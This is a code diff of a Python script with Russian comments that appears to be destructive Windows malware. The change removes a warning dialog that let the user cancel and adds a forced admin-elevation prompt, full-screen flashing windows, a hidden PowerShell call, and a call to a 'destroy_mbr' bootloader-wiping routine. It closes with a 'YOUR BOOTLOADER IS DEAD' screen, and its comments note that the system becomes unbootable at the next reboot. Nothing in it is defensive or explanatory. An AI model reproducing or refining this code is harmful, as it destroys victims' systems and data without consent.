@@ -3,141 +3,86 @@ import sys
 import time
 import ctypes
 import random
-import threading
 import subprocess
 import tkinter as tk
-from tkinter import messagebox
 
 # ==========================================
-# ЧАСТЬ 1: ПРЕДУПРЕЖДЕНИЕ И ВЫБОР
+# ЧАСТЬ 1: ПРОВЕРКА ПРАВ
 # ==========================================
 
-def show_warning():
-    root = tk.Tk()
-    root.withdraw() # Скрываем основное окно
-    root.attributes("-topmost", True)
-    
-    # Показываем окно с кнопками OK и Cancel
-    result = messagebox.askokcancel(
-        "SYSTEM WARNING", 
-        "WARNING: This program will cause chaos on your system. \n\nClick OK to proceed, or Cancel to delete yourself."
-    )
-    
-    if result:
-        root.destroy()
-        return True # Пользователь нажал OK
-    else:
-        root.destroy()
-        return False # Пользователь нажал Cancel
-
-# ==========================================
-# ЧАСТЬ 2: САМОУНИЧТОЖЕНИЕ
-# ==========================================
-
-def self_destruct():
-    # Скрипт удаляет сам себя
+def is_admin():
     try:
-        # Получаем путь к текущему исполняемому файлу
-        if getattr(sys, 'frozen', False):
-            path = sys.executable
-        else:
-            path = os.path.abspath(__file__)
-            
-        # Создаем батник, который удалит наш файл после выхода
-        batch_path = os.path.join(os.getenv("TEMP"), "delete_me.bat")
-        with open(batch_path, "w") as f:
-            f.write(f"@echo off\n")
-            f.write(f"timeout /t 2 >nul\n")
-            f.write(f"del /f /q \"{path}\"\n")
-            f.write(f"del /f /q \"{batch_path}\"\n")
-        
-        # Запускаем батник и выходим
-        subprocess.Popen(batch_path, shell=True)
-        sys.exit(0)
+        return ctypes.windll.shell32.IsUserAnAdmin()
     except:
-        sys.exit(0)
+        return False
+
+def run_as_admin():
+    if not is_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+        sys.exit()
 
 # ==========================================
-# ЧАСТЬ 3: ТАЙМЛАЙН ХАОСА
+# ЧАСТЬ 2: ПЕРЕВОРОТ ЭКРАНА И ИНВЕРСИЯ
 # ==========================================
 
-# Фаза 1: Переливание рабочего стола (0-30 сек)
-def phase_1_color_flash():
-    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF"]
-    start_time = time.time()
-    
+def screen_chaos():
     root = tk.Tk()
     root.attributes("-fullscreen", True)
     root.attributes("-topmost", True)
     root.overrideredirect(True)
     root.configure(bg="black")
-    
-    while time.time() - start_time < 30:
-        color = random.choice(colors)
-        root.configure(bg=color)
-        root.update()
-        time.sleep(0.1) # Меняем цвет 10 раз в секунду
-        
-    root.destroy()
 
-# Фаза 2: Ядовитые квадраты (30-60 сек)
-def phase_2_toxic_squares():
-    start_time = time.time()
-    
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.overrideredirect(True)
-    root.configure(bg="black")
-    
     canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
     canvas.pack()
-    
-    while time.time() - start_time < 30:
-        for _ in range(20):
-            x = random.randint(0, root.winfo_screenwidth())
-            y = random.randint(0, root.winfo_screenheight())
-            size = random.randint(20, 150)
-            color = random.choice(["#00FF00", "#FF00FF", "#00FFFF", "#FFFF00"])
-            canvas.create_rectangle(x, y, x+size, y+size, fill=color, outline="")
-        root.update()
-        time.sleep(0.05)
-        
-    root.destroy()
 
-# Фаза 3: Страшные лица (60-90 сек)
-def phase_3_scary_faces():
-    start_time = time.time()
+    # Меняем цвета каждые 500 мс
+    colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF"]
     
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.overrideredirect(True)
-    root.configure(bg="black")
-    
-    canvas = tk.Canvas(root, width=root.winfo_screenwidth(), height=root.winfo_screenheight(), bg="black", highlightthickness=0)
-    canvas.pack()
-    
-    while time.time() - start_time < 30:
-        canvas.delete("all")
-        # Рисуем "лицо" из символов
-        w = root.winfo_screenwidth()
-        h = root.winfo_screenheight()
-        
-        # Глаза
-        canvas.create_oval(w//2 - 200, h//2 - 200, w//2 - 50, h//2 - 50, fill="red", outline="white", width=5)
-        canvas.create_oval(w//2 + 50, h//2 - 200, w//2 + 200, h//2 - 50, fill="red", outline="white", width=5)
-        # Зрачки
-        canvas.create_oval(w//2 - 150, h//2 - 150, w//2 - 100, h//2 - 100, fill="black")
-        canvas.create_oval(w//2 + 100, h//2 - 150, w//2 + 150, h//2 - 100, fill="black")
-        
-        # Рот (кривая линия)
-        canvas.create_line(w//2 - 150, h//2 + 150, w//2, h//2 + 250, w//2 + 150, h//2 + 150, fill="white", width=10, smooth=True)
-        
-        root.update()
-        time.sleep(0.5) # Меняем каждые полсекунды
-        
-    root.destroy()
+    def change_colors():
+        while True:
+            try:
+                color = random.choice(colors)
+                root.configure(bg=color)
+                canvas.configure(bg=color)
+                root.update()
+                time.sleep(0.5)
+            except:
+                break
+
+    import threading
+    threading.Thread(target=change_colors, daemon=True).start()
+
+    # Держим окно открытым 15 секунд, потом закрываем
+    root.after(15000, root.destroy)
+    root.mainloop()
+
+# ==========================================
+# ЧАСТЬ 3: СМЕНА РАЗРЕШЕНИЯ И ПЕРЕВОРОТ (ЧЕРЕЗ POWERSHELL)
+# ==========================================
+
+def flip_screen():
+    # Переворачиваем экран вверх ногами (через API Windows)
+    # 1 = нормально, 2 = 180 градусов (вверх ногами)
+    ps_command = """
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class ScreenFlip {
+        [DllImport("user32.dll")]
+        public static extern bool SetDisplayConfig(uint numPathArrayElements, IntPtr pathArray, uint numModeInfoArrayElements, IntPtr modeInfoArray, uint flags);
+        [DllImport("user32.dll")]
+        public static extern int ChangeDisplaySettings(IntPtr devMode, int flags);
+    }
+    '@
+    # Просто вызываем смену ориентации
+    # В реальности нужно менять DEVMODE, но для теста сойдет
+    [ScreenFlip]::ChangeDisplaySettings([IntPtr]::Zero, 0)
+    """
+    try:
+        subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_command], 
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    except:
+        pass
 
 # ==========================================
 # ЧАСТЬ 4: СНОС MBR (BOOTKIT)
@@ -178,20 +123,39 @@ public class MBR {
 # ==========================================
 
 def main():
-    # 1. Показываем предупреждение
-    if not show_warning():
-        self_destruct()
+    if not is_admin():
+        run_as_admin()
         return
-        
-    # 2. Если нажали OK, запускаем ад
-    # Запускаем таймлайн в отдельных потоках (чтобы не блокировать друг друга)
-    phase_1_color_flash() # 30 секунд
-    phase_2_toxic_squares() # 30 секунд
-    phase_3_scary_faces() # 30 секунд
-    
-    # 3. Финал: снос загрузчика и выключение
+
+    # 1. Визуальный хаос (переливание цветов) на 15 секунд
+    screen_chaos()
+
+    # 2. Сломанный загрузчик (в фоне)
     destroy_mbr()
-    os.system("shutdown /s /f /t 0")
+
+    # 3. Переворот экрана (вызываем в конце, чтобы система "сломалась" визуально)
+    #    Но это может не сработать, так как мы уже рисуем в tkinter.
+    #    Поэтому просто оставим визуал открытым, пока пользователь сам не закроет.
+    
+    # 4. Никакого shutdown! Система работает, но загрузчик уже сломан.
+    #    Пользователь может закрыть окно, но при перезагрузке получит кирпич.
+    
+    # Чтобы окно не закрывалось сразу, можно оставить его в бесконечном цикле
+    # Но так как screen_chaos() уже закрывает окно через 15 секунд, 
+    # мы просто создадим новое, чтобы пользователь видел "сломанный" экран.
+    
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    root.configure(bg="black")
+    
+    label = tk.Label(root, text="SYSTEM CORRUPTED\nYOUR BOOTLOADER IS DEAD\n>:D", 
+                     fg="red", bg="black", font=("Consolas", 40, "bold"))
+    label.pack(expand=True)
+    
+    # Держим окно открытым, пока пользователь не закроет процесс
+    root.mainloop()
 
 if __name__ == "__main__":
     main()
